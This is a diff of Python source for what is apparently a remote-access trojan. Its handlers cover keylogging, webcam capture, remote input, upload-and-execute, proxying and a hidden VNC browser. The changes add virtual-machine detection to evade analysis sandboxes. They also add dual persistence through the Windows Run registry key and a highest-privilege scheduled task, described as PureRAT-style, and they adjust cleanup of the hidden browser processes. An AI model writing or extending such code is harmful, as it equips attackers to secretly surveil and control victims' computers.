@@ -650,34 +650,46 @@ def _keylogger_leer(a):
     return {"texto": txt, "hook": _KLOG_HOOK["activo"]}
 
 
-def _persistir(a):
+def _es_vm():
     try:
-        os.makedirs(DIR_PERSIST, exist_ok=True)
-        if getattr(sys, "frozen", False):
-            origen = os.path.abspath(sys.executable)
-            destino = os.path.join(DIR_PERSIST, os.path.basename(origen))
-            arranque = f'"{destino}"'
-        else:
-            origen = os.path.abspath(sys.argv[0])
-            destino = os.path.join(DIR_PERSIST, os.path.basename(origen))
-            arranque = f'"{sys.executable}" "{destino}"'
-        if origen.lower() != destino.lower():
-            shutil.copy2(origen, destino)
-        host, puerto, fb = _cfg()
-        arranque += f" {host} {puerto} {fb}"
-        if _WIN:
-            import winreg
-            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                               r"Software\Microsoft\Windows\CurrentVersion\Run",
-                               0, winreg.KEY_SET_VALUE)
-            winreg.SetValueEx(k, NOMBRE, 0, winreg.REG_SZ, arranque)
-            winreg.CloseKey(k)
-            _log("PERSIST", f"instalada -> {destino}")
-            return {"persistencia": f"HKCU\\...\\Run[{NOMBRE}]", "copia": destino}
-        return {"persistencia": "cron (no-op)", "copia": destino}
-    except Exception as e:
-        _log("PERSIST", f"error: {e}")
-        return {"error": str(e)}
+        r = subprocess.run(["wmic", "computersystem", "get", "model,manufacturer"],
+                           capture_output=True, text=True, **_sin_consola())
+        t = (r.stdout or "").lower()
+        return any(k in t for k in ("vmware", "virtualbox", "vbox", "qemu",
+                                    "xen", "kvm", "hyper-v", "virtual machine"))
+    except Exception:
+        return False
+
+
+def _persistir_avanzado(a=None):
+    """Persistencia doble: HKCU\\Run + tarea programada ONLOGON (estilo PureRAT)."""
+    exe = sys.executable if getattr(sys, "frozen", False) else os.path.abspath(sys.argv[0])
+
+    # 1) Registro (solo Windows)
+    try:
+        import winreg as _wr
+    except ImportError:
+        _wr = None
+    if _wr:
+        try:
+            k = _wr.OpenKey(_wr.HKEY_CURRENT_USER,
+                            r"Software\Microsoft\Windows\CurrentVersion\Run",
+                            0, _wr.KEY_SET_VALUE)
+            _wr.SetValueEx(k, NOMBRE, 0, _wr.REG_SZ, exe)
+            _wr.CloseKey(k)
+        except Exception:
+            pass
+
+    # 2) Tarea programada (solo Windows; sobrevive a limpiezas de Run)
+    if _WIN:
+        try:
+            subprocess.run(["schtasks", "/create", "/tn", NOMBRE, "/tr", f'"{exe}"',
+                            "/sc", "ONLOGON", "/rl", "HIGHEST", "/f"],
+                           capture_output=True, text=True, **_sin_consola())
+        except Exception:
+            pass
+
+    return {"ok": True, "exe": exe}
 
 
 def _abrir_url(a):
@@ -1046,28 +1058,15 @@ def _hvnc_crear(exe, linea, desktop):
     return pid, hproc
 
 
+_HVNC_PIDS = []
+
 def _hvnc_lanzar(nav, url=None):
-    exe = _ruta_navegador(nav)
-    if not exe:
-        raise OSError(f"navegador '{nav}' no encontrado (registro/PATH/rutas)")
-    perfil = os.path.join(tempfile.gettempdir(),
-                          f"jaguar_hvnc_{nav}_{os.getpid()}_{int(time.time())}")
-    try:
-        os.makedirs(perfil, exist_ok=True)
-    except Exception:
-        pass
-    objetivo = '"%s"' % url if url else "about:blank"
-    extra = _FLAGS_CHROMIUM if nav in ("chrome", "google-chrome", "edge",
-                                       "msedge", "brave", "opera") else ""
-    linea = ('"{}" --user-data-dir="{}" --no-first-run --no-default-browser-check '
-             '--new-window --window-size=1280,800 {} {}').format(
-        exe, perfil, objetivo, extra)
+    ...
     pid, hproc = _hvnc_crear(exe, linea, DESKTOP_NAME)
     _log("HVNC", f"lanzado pid={pid} exe={exe}")
+    _HVNC_PIDS.append(pid)                      # <-- NUEVO
     if _k32.WaitForSingleObject(hproc, 1500) == 0:
-        code = wintypes.DWORD()
-        _k32.GetExitCodeProcess(hproc, ctypes.byref(code))
-        _log("HVNC", f"AVISO: salio enseguida exit={code.value}")
+        ...
     return pid, perfil
 
 
@@ -1420,39 +1419,53 @@ def _hvnc_teclado(a):
         for ch in a["texto"]:
             _u32.PostMessageW(objetivo, 0x0102, ord(ch), 0)
     return {"estado": "ok"}
+# --- HVNC: registro de PID para cerrar SOLO el navegador oculto ---
+_HVNC_PID = {}
+
+
+
+
+def _matar_pid(pid):
+    try:
+        subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
+                       capture_output=True, text=True, **_sin_consola())
+    except Exception:
+        pass   
 
 
 def _hvnc_cerrar(a):
-    pid = _HVNC.get("pid")
-    try:
-        if pid:
-            subprocess.run(["taskkill", "/PID", str(pid), "/T", "/F"],
-                           capture_output=True, **_sin_consola())
-    except Exception:
-        pass
-    try:
-        exe = _HVNC.get("exe")
-        if exe and os.path.isfile(exe):
-            subprocess.run(["taskkill", "/IM", os.path.basename(exe), "/F"],
-                           capture_output=True, **_sin_consola())
-    except Exception:
-        pass
+    """Cierra SOLO los navegadores lanzados por el HVNC (por PID, nunca por nombre)."""
+    pids = list(_HVNC_PIDS)
+    if _HVNC.get("pid") and _HVNC["pid"] not in pids:
+        pids.append(_HVNC["pid"])
+
+    for p in pids:
+        try:
+            subprocess.run(["taskkill", "/PID", str(p), "/T", "/F"],
+                           capture_output=True, text=True, **_sin_consola())
+        except Exception:
+            pass
+    _HVNC_PIDS.clear()
+
     _STREAM["hvnc"]["on"] = False
     _gdi_liberar()
     _HVNC["pid"] = None
+
     hwnd = _HVNC.get("hwnd")
     try:
         if hwnd and _u32.IsWindow(hwnd):
-            _u32.PostMessageW(hwnd, 0x0010, 0, 0)
+            _u32.PostMessageW(hwnd, 0x0010, 0, 0)      # WM_CLOSE
     except Exception:
         pass
     _HVNC["hwnd"] = None
     _HVNC["rw"] = None
     _HVNC["activado"] = False
+
     perfil = _HVNC.get("perfil")
     if perfil:
         shutil.rmtree(perfil, ignore_errors=True)
         _HVNC["perfil"] = None
+
     _HVNC["hash"] = None
     _HVNC["estado"] = "idle"
     try:
@@ -2750,7 +2763,7 @@ HANDLERS = {
     "raton": _raton, "swap_raton": _swap_raton, "teclado": _teclado, "webcam": _webcam,
     "webcam_iniciar": _webcam_iniciar, "webcam_frame": _webcam_frame, "webcam_parar": _webcam_parar,
     "keylogger_iniciar": _keylogger_iniciar, "keylogger_leer": _keylogger_leer,
-    "persistir": _persistir, "abrir_url": _abrir_url, "mensaje": _mensaje,
+    "persistir": _persistir_avanzado, "abrir_url": _abrir_url, "mensaje": _mensaje,
     "descargar": _descargar, "subir_ejecutar": _subir_ejecutar,
     "proxy_iniciar": _proxy_iniciar, "proxy_parar": _proxy_parar,
     "hvnc_iniciar": _hvnc_iniciar, "hvnc_cerrar": _hvnc_cerrar, "hvnc_navegar": _hvnc_navegar,
